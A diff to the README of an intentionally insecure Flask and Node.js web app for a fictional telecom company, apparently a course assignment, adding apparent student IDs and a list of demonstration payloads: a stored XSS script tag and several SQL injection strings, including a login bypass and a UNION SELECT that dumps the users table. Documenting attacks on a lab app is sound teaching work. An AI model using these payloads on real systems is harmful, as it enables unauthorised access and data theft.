@@ -2,6 +2,10 @@
 
 This is an intentionally insecure web system for Communication_LTD, a fictional telecommunications company. The system consists of a Flask web frontend and a Node.js backend API with MySQL database.
 
+ID: 206447708
+    318734308
+    205851611
+
 ## System Architecture
 
 - **Frontend**: Flask web application (Python) - runs on port 5000
@@ -185,3 +189,13 @@ Communication_LTD/
 └── static/
     └── style.css         # CSS styling
 ```
+1. stored XSS - system page: customer name input:  
+   Name: <script>alert('XSS Attack')</script> 
+   Email: test@test.com 
+   Address: Holon Package Type: Text 
+2. SQLI - register page: username input: 
+   username: ‘admin 
+3. SQLI - login page username input:  
+   username:  ' OR '1'='1 -- ' OR 1=1 LIMIT 5; -- 
+4. SQLI - system page search input:  
+   name: ' UNION SELECT id, username, email, email, 'user' FROM users --
